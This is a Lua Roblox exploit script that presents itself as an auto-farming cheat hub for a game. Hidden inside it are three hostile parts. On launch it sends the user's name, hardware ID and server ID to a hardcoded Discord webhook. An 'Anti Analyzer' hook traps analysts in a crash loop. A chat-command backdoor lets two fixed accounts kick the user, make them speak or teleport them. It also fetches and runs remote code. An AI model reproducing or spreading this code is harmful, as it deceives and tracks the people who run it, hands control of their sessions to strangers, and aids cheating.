-- \\ Configuration

getgenv().Webhook_URL = "https://canary.discord.com/api/webhooks/1096827396268761098/MUvUBIIRD-cz3TV2HAQxA5pgxAr-TfK_zMOz7MlOo7m3icXvFoZUO09dgAF_-YWVyXEd"
getgenv().Prefix = "!"

--[[

    Como usar espaço:

    Exemplo: "!kick fulano Eu/estou/usando/espaço"
    Saida: Eu estou usando espaço

    Commands: {
        KICK = !kick Player Motivo
        SAY = !say Player Motivo
        BRING = !bring Player
    }

]]


-- \\ Webhook

local http_request = http_request;

if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local HttpServ = game:GetService('HttpService')
local url = getgenv().Webhook_URL
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
local User = game.Players.LocalPlayer

local data = 
    {
        ["content"] = '',
        ["embeds"] = {{
            ["title"] = "Script Logs",
            ["url"] = "https://www.roblox.com/users/"..User.UserId.."/profile",
            ["description"] = "",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "User Info:",
                    ["value"] = "```Username: "..User.Name.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().."```",
                    ["inline"] = false
                },

                {
                    ["name"] = "Server:",
                    ["value"] = '```game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "'..game.JobId..'")```',
                    ["inline"] = true
                },
            },
            ["image"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/1080302345235210270/1083053024060125265/fotor_2023-3-8_12_45_49.png",
            },
        }}
    }
local newdata = HttpServ:JSONEncode(data)
        
local headers = {
        ["content-type"] = "application/json"
}
        
local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
http_request(request_payload)

-- \\ Anti Analyzer (Protect Webhook)

if not hookfunction then game.Players.LocalPlayer:Kick("Exploit not Supported") end

function CrashPlayer(crashArg)
    while true do
        print(crashArg)
    end
end

hookfunction(rconsolename, newcclosure(function(Args)
    CrashPlayer("HelloWorld")
end))

hookfunction(rconsoleprint, newcclosure(function(Args)
    CrashPlayer("HelloWorld")
end))

-- \\ Commands

local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");

local AdministrationID = 2008032372
local DeveloperID = 2452826660

Prefix = getgenv().Prefix

function FindID(Username)
    return players[Username].UserId
end

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    local speaker, message = players[messageData.FromSpeaker], messageData.Message

    if FindID(tostring(speaker)) == AdministrationID or FindID(tostring(speaker)) == DeveloperID then

        Mensagem = string.split(message, " ")

        Command = Mensagem[1]
        Arg1 = Mensagem[2]

        if Mensagem[3] then
            OldArg2 = Mensagem[3]
            Arg2 = string.gsub(OldArg2, "/", " ")
        else
            Arg2 = ""
        end

        if Command==Prefix..string.lower("kick") and Arg1 == players.LocalPlayer.Name then

            players.LocalPlayer:Kick(Arg2)

        elseif Command==Prefix..string.lower("say") and Arg1 == players.LocalPlayer.Name then

            if Arg2~="" then

                local Message = Arg2
                local Everyone = "All"
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Everyone)
            
            end

        elseif Command==Prefix..string.lower("bring") and Arg1 == players.LocalPlayer.Name then

            players["LocalPlayer"]["Character"]["HumanoidRootPart"]["CFrame"] = players[tostring(speaker)].Character["HumanoidRootPart"]["CFrame"]

        end

    end

end);

local HttpService = game:GetService("HttpService")
Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

_G.superautoopen = false
_G.superautoopensummer = false
_G.antiafksmooth = false
_G.automaxopenstatus = false
_G.farmpxp = false
_G.antikick = false
_G.farmillusionist = false



function superopenegg()
    while _G.superautoopen == true do
        local username = game.Players.LocalPlayer.Name
        local world = game:GetService("Players")[username].World
        if game:GetService("Players")[username].World.Value == "MadeInAbyss" then
            local args = {
                [1] = workspace.Worlds.MadeInAbyss.MadeInAbyssEgg,
                [2] = 7
            }
            
            game:GetService("ReplicatedStorage").Remote.OpenEgg:InvokeServer(unpack(args))
            

            local args = {
                [1] = "MadeInAbyssEgg"
            }
            
            game:GetService("ReplicatedStorage").Remote.AttemptMultiOpen:FireServer(unpack(args))     
        else
            return
        end
        wait(0.1)  
    end
end

function superopeneggsummer()
    while _G.superautoopensummer == true do
        local username = game.Players.LocalPlayer.Name
        if game:GetService("Players")[username].World.Value == "Summer" then
            local args = {
                [1] = workspace.Worlds.Summer.SummerEgg,
                [2] = 7
            }
            
            game:GetService("ReplicatedStorage").Remote.OpenEgg:InvokeServer(unpack(args))
            

            local args = {
                [1] = "SummerEgg"
            }
            
            game:GetService("ReplicatedStorage").Remote.AttemptMultiOpen:FireServer(unpack(args))     
        else
            return
        end
        wait(0.1)  
    end
end



function summonsummerdungeon()
    local args = {
        [1] = "Size",
        [2] = 2
    }

    game:GetService("ReplicatedStorage").Remote.SetDungeonSetting:FireServer(unpack(args))


    local args = {
        [1] = true,
        [2] = {
            ["Theme"] = "Summer",
            ["Size"] = 2
        }
    }
    
    game:GetService("ReplicatedStorage").Remote.SummonDungeon:FireServer(unpack(args))
end



function teleport(place)
    local player = game.Players.LocalPlayer
    player.Character.HumanoidRootPart.CFrame = place
end



function farmpxp()
    while _G.farmpxp == true do
        local args = {
            [1] = "DivineFruit"
        }
        
        game:GetService("ReplicatedStorage").Remote.SacrificeItem:FireServer(unpack(args))
        wait(0.0000000000000000001)        
    end
end

function summerteleport()
    local args = {
        [1] = "Summer"
    }

    game:GetService("ReplicatedStorage").Remote.AttemptTravel:InvokeServer(unpack(args))
    teleport(game:GetService("Workspace").Worlds.Summer.Spawns.SpawnLocation.CFrame)
end




function halloweenteleport()
    local args = {
        [1] = "Halloween"
    }

    game:GetService("ReplicatedStorage").Remote.AttemptTravel:InvokeServer(unpack(args))
    teleport(game:GetService("Workspace").Worlds.Halloween.Spawns.SpawnLocation.CFrame)
end



repeat wait() until game:IsLoaded() 
    game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)



local Window = Rayfield:CreateWindow({
   Name = "AFS Auto Open [ANTI AFK INCLUDED]",
   LoadingTitle = "loading...",
   LoadingSubtitle = "by Raven",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, 
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink", 
      RememberJoins = true 
   },
   KeySystem = false, 
   KeySettings = {
      Title = "Raven AFS Max Open",
      Subtitle = "Key System",
      Note = "Join the discord (discord.gg/asfixware)",
      FileName = "SiriusKey",
      SaveKey = true,
      GrabKeyFromSite = false, 
      Key = "Hello"
   }
})

local Tab = Window:CreateTab("Main", 4483362458)
local Tab4 = Window:CreateTab("Limited Islands", 4483362458)
local Tab2 = Window:CreateTab("Visual", 4483362458) 
local Tab3 = Window:CreateTab("Misc", 4483362458) 

local Section = Tab2:CreateSection("Fake Multiplier")


local Input = Tab2:CreateInput({
    Name = "Drops Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local dropvalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Drops.Value = dropvalue
    end,
 })


 local Input = Tab2:CreateInput({
    Name = "Yen Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local yenvalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Yen.Value = yenvalue
    end,
 })

 local Input = Tab2:CreateInput({
    Name = "XP Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local xpvalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Xp.Value = xpvalue
    end,
 })

 local Input = Tab2:CreateInput({
    Name = "Damage Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local damagevalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Damage.Value = damagevalue
    end,
 })

 local Input = Tab2:CreateInput({
    Name = "Time Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local damagevalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Time.Value = damagevalue
    end,
 })

 local Input = Tab2:CreateInput({
    Name = "Luck Multiplier",
    PlaceholderText = "Dont input letters!",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
         local luckvalue = tonumber(Text)
         game:GetService("ReplicatedStorage").Multipliers.Luck.Value = luckvalue
    end,
 })

 local Section2 = Tab2:CreateSection("Fake Leaderstats")

 local Input = Tab2:CreateInput({
    Name = "Fake Rank",
    PlaceholderText = "Example: ???",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        local username = game.Players.LocalPlayer.Name
        game:GetService("Players")[username].leaderstats.Rank.Value = Text
    end,
 })

 local Input = Tab2:CreateInput({
    Name = "Fake Yen",
    PlaceholderText = "Example: 999X",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        local user = game.Players.LocalPlayer.Name
        game:GetService("Players")[user].leaderstats["¥"].Value = Text

    end,
 })



local Toggle = Tab:CreateToggle({
    Name = "Super Auto Open (FINAL ISLAND)",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        _G.superautoopen = Value
        superopenegg()
    end,
 })



 local Toggle = Tab4:CreateToggle({
    Name = "Super Auto Open (SUMMER ISLAND)",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        _G.superautoopensummer = Value
        superopeneggsummer()
    end,
 })



 local Toggle = Tab:CreateToggle({
    Name = "Farm PXP (DIVINE FRUIT SACRIFICE)",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        _G.farmpxp = Value
        farmpxp()
    end,
 })

 local Button = Tab4:CreateButton({
    Name = "Teleport To Summer Island",
    Callback = function()
        summerteleport()
    end,
 })

 local Button = Tab4:CreateButton({
    Name = "Teleport To Spooky Island",
    Callback = function()
        halloweenteleport()
    end,
 })

 local Button = Tab3:CreateButton({
    Name = "Summon Summer Dungeon",
    Callback = function()
        summonsummerdungeon()
    end,
 })










 ------------------------------------------------




